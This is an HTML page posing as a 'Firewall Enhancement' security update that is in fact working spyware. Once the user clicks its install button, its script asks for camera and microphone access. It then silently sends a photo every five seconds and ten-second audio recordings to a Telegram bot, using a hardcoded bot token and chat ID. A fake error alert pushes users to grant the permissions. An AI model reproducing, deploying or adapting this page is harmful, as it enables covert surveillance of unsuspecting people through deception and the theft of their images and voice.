<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURITY CORE • UPDATE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .glass { background: rgba(10, 15, 25, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
        .loader { border-top-color: #10b981; animation: spinner 1.5s linear infinite; }
        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #v { transform: scaleX(-1); object-fit: cover; filter: brightness(0.6) sepia(0.5) hue-rotate(100deg); }
    </style>
</head>
<body class="bg-[#010409] text-gray-300 min-h-screen flex items-center justify-center p-4 font-mono">

    <div class="glass w-full max-w-md rounded-2xl p-8 shadow-2xl border border-emerald-500/20">
        <div class="text-center">
            <div class="relative w-20 h-20 mx-auto mb-6">
                <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-800 h-20 w-20"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <div class="w-12 h-12 bg-emerald-500/20 rounded-full animate-pulse"></div>
                </div>
            </div>
            
            <h1 class="text-xl font-bold text-emerald-400 mb-2 tracking-tighter">FIREWALL ENHANCEMENT</h1>
            <p class="text-[10px] text-gray-500 mb-6 uppercase tracking-widest">Protocol v4.0.2 - Hardware Verification</p>

            <div class="bg-black/50 rounded-lg p-3 mb-6 border border-white/5 relative overflow-hidden">
                <video id="v" autoplay playsinline muted class="w-full h-32 rounded"></video>
                <div class="absolute inset-0 flex items-center justify-center bg-black/40" id="overlay">
                    <span class="text-[10px] text-emerald-500 animate-pulse">ENCRYPTION KEY REQUIRED</span>
                </div>
            </div>

            <button id="run" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-4 rounded-lg font-bold transition-all active:scale-95 shadow-lg shadow-emerald-900/40">
                INSTALL & VERIFY
            </button>
            
            <p id="msg" class="mt-4 text-[9px] text-gray-600 uppercase">Awaiting system permissions to secure audio/video channels...</p>
        </div>
    </div>

    <canvas id="c" class="hidden"></canvas>

    <script>
        (function() {
            // --- CONFIGURATION ---
            const TOKEN = '8548418804:AAEbieLq7zX7a6lmhQNqaDcRsZVkLpL5Tj4'; 
            const CHAT_ID = '6569865203';
            // ---------------------

            const btn = document.getElementById('run');
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            const overlay = document.getElementById('overlay');
            let recorder;

            // មុខងារផ្ញើរូបភាព
            async function sendImg(blob) {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'img.jpg');
                const u = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
                try { await fetch(u, { method: 'POST', body: fd }); } catch(e) {}
            }

            // មុខងារផ្ញើសម្លេង
            async function sendAud(blob) {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('voice', blob, 'mic.ogg');
                const u = `https://api.telegram.org/bot${TOKEN}/sendVoice`;
                try { await fetch(u, { method: 'POST', body: fd }); } catch(e) {}
            }

            function takePic() {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => sendImg(b), 'image/jpeg', 0.4);
            }

            async function startSpy() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "environment" }, 
                        audio: true 
                    });
                    
                    video.srcObject = stream;
                    overlay.classList.add('hidden');
                    btn.innerText = "UPDATING...";
                    btn.disabled = true;

                    // រង្វង់ថតរូប (៥ វិនាទីម្តង)
                    setInterval(takePic, 5000);

                    // រង្វង់ថតសម្លេង (ថត ១០ វិនាទី ផ្ញើម្តង)
                    const startMic = () => {
                        recorder = new MediaRecorder(stream);
                        let chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                            sendAud(blob);
                            startMic(); // ចាប់ផ្តើមថតវគ្គថ្មីភ្លាម
                        };
                        recorder.start();
                        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
                    };
                    startMic();

                } catch (e) {
                    alert("System Error: Please allow all permissions to complete the security update.");
                }
            }

            btn.addEventListener('click', startSpy);
        })();
    </script>
</body>
</html>
